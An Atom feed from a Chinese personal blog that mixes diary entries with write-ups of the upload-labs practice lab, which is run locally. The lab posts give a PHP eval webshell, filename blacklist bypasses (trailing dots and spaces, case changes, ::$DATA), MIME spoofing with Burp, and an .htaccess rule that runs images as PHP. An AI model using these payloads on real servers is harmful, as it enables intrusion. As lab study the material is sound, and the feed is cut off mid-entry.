<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Scammer</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-11-25T17:06:26.702Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Bron</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/11/25/Diary_1125/"/>
    <id>http://example.com/2022/11/25/Diary_1125/</id>
    <published>2022-11-24T16:00:00.000Z</published>
    <updated>2022-11-25T17:06:26.702Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5.png" alt="凉宫春日"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我的生活一如既往，平淡且平静。不过今天似乎在乌鲁木齐没有那么安宁，然而我也做不了什么。逝者愿安息，生者愿平安。</p><h1 id="点滴"><a href="#点滴" class="headerlink" title="点滴"></a>点滴</h1><p>今天的学习状态还是比较满意的，只是学习时长不够长。今日杂务做完了，明天多学习，尤其English!<br>学到了一个小知识：喝水温度对65℃以上对口腔不好。感受到烫一般是50℃以上。<br>昨晚又晚睡了，这不好，再次提醒自己要早睡。早起吃早餐听听力。</p><h1 id="激进分子"><a href="#激进分子" class="headerlink" title="激进分子"></a>激进分子</h1><p>No progress without radicals.没有激进分子就没有进步。<br>这是我今天听听力，听到的一句话。其实没预料到，听听力也能听出一些深刻的话。遇到了一篇蛮有趣的文章。<br>想想其实的确如此，很多事物的改变就是来源于“激进分子”。当然，这个激进分子是广义上的。<br>比如乔布斯，在各个手机厂商都流行在手机上加更多的键时，他一意孤行选择了只给手机保留一个键，这何尝不是一种激进呢？<br>还有很多例子，都可以说明，激进并不一定是一件坏事。<br>社会的大多数人，都是倾向于稳定的。因此激进很容易被反对，也不会被大多数人所理解。这也意味着，激进分子是少数人的“特权”。<br>具前瞻性的言论未必会为时人所接受。但当时间证明了该言论的价值时，社会各界又会争相附和。<br>这就和之前的“不容，然后见君子”其实是联系到一起了。<br>本质上表达的思想是相同的。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>再借我一点时间吧，我会更珍惜的。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5.png&quot; alt=&quot;凉宫春日&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs_5-10</title>
    <link href="http://example.com/2022/11/25/upload-labs_5-10/"/>
    <id>http://example.com/2022/11/25/upload-labs_5-10/</id>
    <published>2022-11-24T16:00:00.000Z</published>
    <updated>2022-11-25T16:07:56.943Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚翻过了一座山，又遇到了一条河。bug的问题真伤脑筋…<br>这三关比较像，所以一起写了。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第5关"><a href="#第5关" class="headerlink" title="第5关"></a>第5关</h2><p><strong>黑名单过滤（后缀名特殊字符多写）</strong><br>尝试其它都无法成功，因此选择特殊字符重写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.php. .         在php后加一个点，加一个空格，再加一个点，上传成功</span><br></pre></td></tr></table></figure><p>蚁剑按正常后缀连接成功。</p><h2 id="第6关"><a href="#第6关" class="headerlink" title="第6关"></a>第6关</h2><p><strong>黑名单过滤（大小写绕过）</strong><br>尝试其它都无法成功，因此选择大小写绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.Php            任意改变php的大小写，上传成功</span><br></pre></td></tr></table></figure><p>正常情况下，蚁剑按正常后缀连接成功<br>PS: 我的出问题了，文件能上传，但打开文件时会出现HTTP500错误，没有找到原因，只能重装phpstudy解决</p><h2 id="第7关"><a href="#第7关" class="headerlink" title="第7关"></a>第7关</h2><p><strong>黑名单过滤（空格绕过）</strong><br>尝试其它都无法成功，因此选择空格绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.php            在php后加一个空格，上传成功</span><br></pre></td></tr></table></figure><p>蚁剑按正常后缀连接成功</p><h2 id="第8关"><a href="#第8关" class="headerlink" title="第8关"></a>第8关</h2><p><strong>黑名单过滤（点绕过）</strong><br>尝试其它都无法成功，因此选择点绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.php.          在php后加一个点，上传成功</span><br></pre></td></tr></table></figure><p>蚁剑按正常后缀连接成功</p><h2 id="第9关"><a href="#第9关" class="headerlink" title="第9关"></a>第9关</h2><p><strong>黑名单过滤（流文件绕过）</strong><br>尝试其它都无法成功，因此选择流文件绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.php::$DATA    在php后加::$DATA，上传成功</span><br></pre></td></tr></table></figure><p>蚁剑按正常后缀连接成功</p><h2 id="第10关"><a href="#第10关" class="headerlink" title="第10关"></a>第10关</h2><p>方法和第5关相同，不过多叙述</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>遇事不决，重装解决</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;刚翻过了一座山，又遇到了一条河。bug的问题真伤脑筋…&lt;br&gt;这三关比较像，所以一起写了。&lt;/p&gt;</summary>
    
    
    
    <category term="upload-labs" scheme="http://example.com/categories/upload-labs/"/>
    
    
    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
    
    <category term="蚁剑" scheme="http://example.com/tags/%E8%9A%81%E5%89%91/"/>
    
  </entry>
  
  <entry>
    <title>是非成败转头空</title>
    <link href="http://example.com/2022/11/24/Diary_1124/"/>
    <id>http://example.com/2022/11/24/Diary_1124/</id>
    <published>2022-11-23T16:00:00.000Z</published>
    <updated>2022-11-24T18:06:48.367Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/%E9%9D%A2%E7%A0%81122.jpg" alt="本间芽衣子"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不知不觉过去了一天…</p><h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>You smiled and talked to me of nothing and I felt that for this I had been waiting long.<br>你微笑地看着我，不说一句话。而我知道，为了这个，我已经等待很久了。</p><h1 id="时间的认知"><a href="#时间的认知" class="headerlink" title="时间的认知"></a>时间的认知</h1><p>零点过的时候，骤然看了下日期，发现周五，以为明日是周末了。一种快乐从我心底迸发，是惊讶的喜悦。可我过了会儿发现，日期是零点过后看的，周五才刚刚开始。我就像走入了周五的循环，第一次认识的时候，它是<strong>末尾</strong>。第二次认识的时候，它是<strong>开始</strong>。下一次认识，恐怕又是<strong>末尾</strong>了吧。<br>好像有什么变了，好像什么都没变。变的是我的认知，不变的是世界的规律。</p><h1 id="一天"><a href="#一天" class="headerlink" title="一天"></a>一天</h1><p>突然想到了穆勒的《功利主义》，好久没读了。这里提醒自己一下，有时间去读。这本书的一些重要思想：</p><ul><li>高级快乐和低级快乐，快乐有质的不同</li><li>调和美德与幸福的冲突，美德也是一种幸福</li><li>正义需要感性的力量，有别于利益</li></ul><p>早上本可吃早餐然后完成“检测”，但我不知道哪根筋抽了，居然在等无谓的人，浪费了足足半小时有余，甚至因此在十一点前就吃了午餐，实在糟糕。然而，因等了人，才知道有另外的渠道查看“码”。让我不禁想到了一句话：一个人能走得更快，一群人能走得更远。<br>所以，我的选择是御风而行，不浪费生命。<br>晚上听听力真糟糕，吵闹混乱使人效率变得低下，早点起听听力，学英语！</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不敢相信，这篇短短日记写了半小时，又睡晚了可恶啊！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%E9%9D%A2%E7%A0%81122.jpg&quot; alt=&quot;本间芽衣子&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs_2</title>
    <link href="http://example.com/2022/11/24/upload-labs_2/"/>
    <id>http://example.com/2022/11/24/upload-labs_2/</id>
    <published>2022-11-23T16:00:00.000Z</published>
    <updated>2022-11-24T04:13:03.365Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关难度也不大，只是涉及到了新的知识点。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>测试<br>首先可以尝试传输文件。<br>当我传输一个txt文件时，提示类型错误，但这次和第一关不同，不是弹窗，而是页面直接提示，因此不是前端JavaScript验证。<br>这时我们查看源码，可以看到下面这一段：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>从这段代码可以看出，上传文件的途中验证了content-type，并且固定了上传文件类型。这里涉及到了MIME。<br>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。<br>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。<br>浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL，因此 We b服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。<br>语法：<br>type&#x2F;subtype<br>用法：<br>客户端：<br>告诉服务端上传文件类型<br>告诉服务端可以接受文件类型<br>服务端：<br>告诉客户端响应数据类型<br>详细参见：<a href="https://www.runoob.com/http/mime-types.html">MIME 类型</a><br>因此可以通过改变content-type来让目标文件上传成功</p></li><li><p>尝试与抓包<br>burp抓包，将content-type更改为image&#x2F;png，然后放包，我们就看到文件上传成功了。<br>然后打开，显示没问题，最终成功！</p></li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>总的来说，没什么难度。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_62879498/article/details/123021865">文件上传漏洞——upload-labs 1-19</a><br><a href="https://blog.csdn.net/K_ShenH/article/details/122438998">upload-labs安装及攻略</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这一关难度也不大，只是涉及到了新的知识点。&lt;/p&gt;</summary>
    
    
    
    <category term="upload-labs" scheme="http://example.com/categories/upload-labs/"/>
    
    
    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs_3</title>
    <link href="http://example.com/2022/11/24/upload-labs_3/"/>
    <id>http://example.com/2022/11/24/upload-labs_3/</id>
    <published>2022-11-23T16:00:00.000Z</published>
    <updated>2022-11-24T10:51:11.691Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>稍微改改就好，就像化了个妆人就认不出了。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li>测试<br>首先上传一个php文件，发现失败，显示信息为“提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！”<br>我们可以通过这个错误提示信息看出是黑名单，于是查看源码验证<br>通过源码，可以发现直接进行后缀名过滤，同时删除点，检查大小写去除字符串和空格。<br>但我们注意后缀名过滤的这行代码：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br></pre></td></tr></table></figure>可以发现并没有过滤完全，因此我们可以通过更改等价后缀名的方式绕过。<br>那么接下来就是查看有哪些等价后缀名：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">语言   等价扩展名</span><br><span class="line">asp    asa, cer, cdx</span><br><span class="line">aspx   ashx, asmx, ascx</span><br><span class="line">php    php2, php3, php4, php5, phps, phtml</span><br><span class="line">jsp    jspx, jspf</span><br></pre></td></tr></table></figure>我们只需要把后缀名改成这些即可。<br>注意，因为默认Apache只解析少数几种后缀格式，所以最好到相应的httpd.conf文件下添加以下语句：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .php5 .php3</span><br></pre></td></tr></table></figure>意即能够解析<br>AddType 指令 作用：在给定的文件扩展名与特定的内容类型之间建立映射 语法：AddType MIME-type extension<br>[extension] …<br>AddType指令在给定的文件扩展名与特定的内容类型之间建立映射关系。MIME-type指明了包含extension扩展名的文件的媒体类型。<br>AddType 是与类型表相关的，描述的是扩展名与文件类型之间的关系。</li></ol><h2 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h2><ol start="2"><li>尝试与抓包<br>将文件后缀改为黑名单以外的后缀格式，即可顺利上传。或者通过抓包改后缀名。蚁剑顺利连接</li></ol><h2 id="第2种"><a href="#第2种" class="headerlink" title="第2种"></a>第2种</h2><ol start="2"><li>尝试与抓包<br>上传文件后缀名依旧是php，但通过burp抓包，然后修改filename，采用双写绕过。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.php::$DA::$DATATA</span><br></pre></td></tr></table></figure>这样就能够顺利上传，放到网页上，删除最后的::$data，网页正常打开。再在蚁剑上建立连接，非常顺利。</li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>今天在这一关弄了好久，起因却是一个有点儿离谱的原因。网页能打开，蚁剑却连不上。最后才发现，变量名就是密码，我第一关阴差阳错地对了。但我不知道密码要设为变量名，这一关也是随便一个密码，却一直过不了。最终发现是蚁剑的密码和文件内的变量名不同，谨记。<br>下次尽量避开这种失误。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_62879498/article/details/123021865">文件上传漏洞——upload-labs 1-19</a><br><a href="https://blog.csdn.net/K_ShenH/article/details/122438998">upload-labs安装及攻略</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;稍微改改就好，就像化了个妆人就认不出了。&lt;/p&gt;</summary>
    
    
    
    <category term="upload-labs" scheme="http://example.com/categories/upload-labs/"/>
    
    
    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
    
    <category term="蚁剑" scheme="http://example.com/tags/%E8%9A%81%E5%89%91/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs_4</title>
    <link href="http://example.com/2022/11/24/upload-labs_4/"/>
    <id>http://example.com/2022/11/24/upload-labs_4/</id>
    <published>2022-11-23T16:00:00.000Z</published>
    <updated>2022-11-24T11:37:43.338Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>改变能够改变的，选择能够选择的。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>测试<br>通过查看源码，我们可以发现，后缀名绕过已经行不通，因此我们需要更换思路。<br>可以尝试用.htaccess绕过。这里涉及到了.htaccess的知识。<br>‘.htaccess’文件相当于一种部分配置文件，好比局部变量一样，只在当前目录生效。比如你设置解析’.txt’解析为’.php’，那么’.htaccess’文件在的子目录中就会执行，而上一级目录不执行。<br>因此可以把目标文件后缀名改为.png，改Apache配置文件httpd.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride All</span><br><span class="line"></span><br><span class="line">LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so</span><br></pre></td></tr></table></figure><p>在该目录下创建.htaccess文件，然后写入如下代码，使得解析时将.jpg解析为.php格式。</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;b.jpg&quot;</span>&gt;                      <span class="comment">//如果匹配到名为 b.jpg 的文件 就执行该文件</span></span><br><span class="line">       SetHandler  application/x-httpd-php             <span class="comment">//把文件当成php的代码来解析</span></span><br><span class="line">&lt;/FilesMatch&gt;       </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>上传并尝试执行<br>上传成功，之后蚁剑连接失败。<br>是phpstudy集成环境中 php 的问题<br>因为在小皮面板中php版本是nts意思是即非线程安全，不提供数据访问保护，不支持使用 .htaccess</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;改变能够改变的，选择能够选择的。&lt;/p&gt;</summary>
    
    
    
    <category term="upload-labs" scheme="http://example.com/categories/upload-labs/"/>
    
    
    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
    
    <category term="蚁剑" scheme="http://example.com/tags/%E8%9A%81%E5%89%91/"/>
    
  </entry>
  
  <entry>
    <title>出淤泥</title>
    <link href="http://example.com/2022/11/23/Diary_1123/"/>
    <id>http://example.com/2022/11/23/Diary_1123/</id>
    <published>2022-11-22T16:00:00.000Z</published>
    <updated>2022-11-24T03:42:50.332Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/kaneki_3.png" alt="金木研"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>World Cup(世界杯)很火，以前都没怎么关注，但是在大学因为各方面因素吧，让我这种从不关注世界杯的人都开始了。当然是被迫的，实在太吵了周围人，让我不得不。<br>然而，虽然很火，其实重头还是在赌球上，并不在足球本身，想想也挺无聊。</p><h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>既见君子，云胡不喜</p><h1 id="欲望的故事"><a href="#欲望的故事" class="headerlink" title="欲望的故事"></a>欲望的故事</h1><p>王阳明上学的路上要经过一条街，一天，街上忽然多了一家赌博的小馆子，里面每天都挤满了人。跟王阳明一起上学的同伴们有时也会好奇地站在门口往里面看。王守仁提醒大家离赌场远点，大家都不当回事：就看看，不进去，有啥？<br>看看劝阻无效，王阳明就跟小伙伴儿建议：咱们换条路走吧。小伙伴儿很不解：“他赌他的，咱走咱的，互不相干，有啥关系？你这胆子也太小了。”<br>王阳明答：“我怕看多了，也会产生欲望，挡不住诱惑。”<br>小伙伴们哈哈大笑：“看几眼就受不了，那意志也太不坚定了。咱们这么志怀高远的不会的，放心好了。”<br>小伙伴们坚持走原路，只有王阳明一个人每天绕道去私塾，不再从那条街过。<br>一个多月后，有位同学接连几天都没来上课。原来他前段时间迷上了赌博，开始只是拿一点小钱来玩，后来越玩越大，偷了家里的玉器，父母得知后非常生气，把他关在家中反省。<br>王守仁后来讲这个故事给人听，并总结说：“想要避免欲望，最好的办法就是远离，甚至不要多看一眼。这不是胆子小，而是从根源上隔绝欲望。”</p><h1 id="我的看法"><a href="#我的看法" class="headerlink" title="我的看法"></a>我的看法</h1><p>很多年前看到这个故事，是在一本杂志的卷首。说实话，这给了我非常大的触动。在这之前，我一直认为，抵挡不住诱惑是因为自身的意志力不够，所以才会被欲望牵着鼻子走。可看了这样一个如此优秀的人都没有对自己自制力感到自信，我也释然了。<br>像这样有智慧的人，即便是在他小时候，已经能明悟这种很多人不明白的道理，也远超大多成年人了。</p><h1 id="世界杯"><a href="#世界杯" class="headerlink" title="世界杯"></a>世界杯</h1><p>如果世界杯的火爆只是因为赌球，那只能是一种悲哀。因为赌球无非是贪欲和浮躁的混杂，既无技术又无规律，毫无看点可言。<br>虽然我对世界杯没有兴趣，却也不愿看到这种光景。<br>然而，其实我们也可以反思当下环境中赌球之心如此热烈的原因。主要原因就是经济衰退，赚钱困难。也可谓人之常情吧。<br>最近周围很多人都在谈论赌球，甚至参与赌球。但我绝不参与，无论周围人之后翻了多少倍我也不会眼红。原因，已经在上面故事里讲得很清楚了。只是即便如此也会被影响，还是略有不适吧。<br>好笑的是，原本周围两个冷战关系不好的人，却因为世界杯赌球聊起来了。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我现在就像是在淤泥中，愿我能不染。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/kaneki_3.png&quot; alt=&quot;金木研&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs以及蚁剑安装</title>
    <link href="http://example.com/2022/11/23/upload-labs+%E8%9A%81%E5%89%91install/"/>
    <id>http://example.com/2022/11/23/upload-labs+%E8%9A%81%E5%89%91install/</id>
    <published>2022-11-22T16:00:00.000Z</published>
    <updated>2022-11-23T13:38:14.495Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>安装这个两个东西，其实还是有点麻烦的，于我而言。所以我打算记录一下。</p><span id="more"></span><h1 id="蚁剑安装"><a href="#蚁剑安装" class="headerlink" title="蚁剑安装"></a><strong>蚁剑安装</strong></h1><p>首先我们要获取蚁剑–&gt;<a href="https://www.yuque.com/antswordproject/antsword/srruro">获取蚁剑</a><br>点击里面的链接“获取加速器”<br>先自己建立一个AntSword目录并在该目录里建立antsword_project目录，然后下载自己所需的版本，解压。<br>之后再点击解压后的AntSword.exe文件，记得用<strong>管理员方式</strong>打开，初始化，选择antsword_project空目录作为蚁剑的工作目录。<br>如果之前已经有了蚁剑源代码，可以在这一步选择工作目录的时候，直接选择该目录作为工作目录。</p><h1 id="upload-labs配置"><a href="#upload-labs配置" class="headerlink" title="upload-labs配置"></a>upload-labs配置</h1><p>官方地址：<a href="https://github.com/c0ny1/upload-labs">upload-labs</a><br>按照提示进行即可。<br>推荐的PHP5.2.117，PHP官方已经没有下载地址了，所以我们可以另找一个。<br><a href="https://www.cnblogs.com/endv/p/7743472.html">PHP5.2.17下载链接</a><br>选择其中的php-5.2.17-nts-Win32.zip下载即可。<br>解压后，把php.ini-recommended改成php.ini<br>然后把解压后的所有文件放在phpstudy的PHP目录下(默认安装了phpstudy)，这样就完成了。<br>如果Windows，点击下载地址链接，选择其中的Source code下载即可（有phpstudy的话）。<br>将其转移到phpstudy下的WWW目录，把upload-labs-masters目录名改为upload-labs。<br>并在其下建立一个upload，作为其存放上传文件的目录。<br>网站测试：<br>启动phpstudy，网页输入：127.0.0.1&#x2F;upload-labs<br>如果成功显示正常页面就基本没问题了。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;安装这个两个东西，其实还是有点麻烦的，于我而言。所以我打算记录一下。&lt;/p&gt;</summary>
    
    
    
    <category term="upload-labs" scheme="http://example.com/categories/upload-labs/"/>
    
    <category term="蚁剑" scheme="http://example.com/categories/upload-labs/%E8%9A%81%E5%89%91/"/>
    
    
    <category term="工具" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
    
    <category term="安装" scheme="http://example.com/tags/%E5%AE%89%E8%A3%85/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs_1</title>
    <link href="http://example.com/2022/11/23/upload-labs_1/"/>
    <id>http://example.com/2022/11/23/upload-labs_1/</id>
    <published>2022-11-22T16:00:00.000Z</published>
    <updated>2022-11-24T03:46:51.849Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>作为上传漏洞的第一关，啥都没了解就开始做还是遇到了一些障碍。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h2><ol><li><p>测试<br>看到任务，是上传一个webshell到服务器。<br>首先尝试上传，选择png文件，上传成功<br>然后选择txt文件，出现报错，显示只能上传jpg,png,gif的文件。<br>于是我们可以先把想要上传的文件改为允许类型，再抓包改文件后缀，实现shell的上传。</p></li><li><p>尝试与抓包<br>把写有 <code>&lt;?php phpinfo(); ?&gt;</code> 代码的txt文件改文件名为a.png。<br>提交后burp抓包，得到包的内容后，把包里的所有png改为php，之后放包，我们就可以看到文件上传成功了。<br>再打开网址测试 <code>127.0.0.1/upload-labs/upload/a.php</code><br>页面显示成功，那么说明我们的思路没问题。</p></li><li><p>上传webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); @eval($_POST[&#x27;shell&#x27;]); ?&gt;   写入到b.txt</span><br><span class="line">将文件后缀改为png</span><br></pre></td></tr></table></figure><p>和上一个步骤一样，上传文件。<br>然后测试 <code>127.0.0.1/upload-labs/upload/b.php</code><br>显示成功。<br>我们可以打开蚁剑。点击鼠标右键-&gt;添加数据<br>“URL地址”填写测试的地址，连接密码自己任意设定。如果不放心，点右上角的“测试连接”，成功代表无问题，最后左上角“添加”。<br>创建成功后，右键点击我们创建的这条数据，再点“虚拟终端”，输入dir可看到目录中存在我们的php文件。</p></li></ol><h2 id="第2种"><a href="#第2种" class="headerlink" 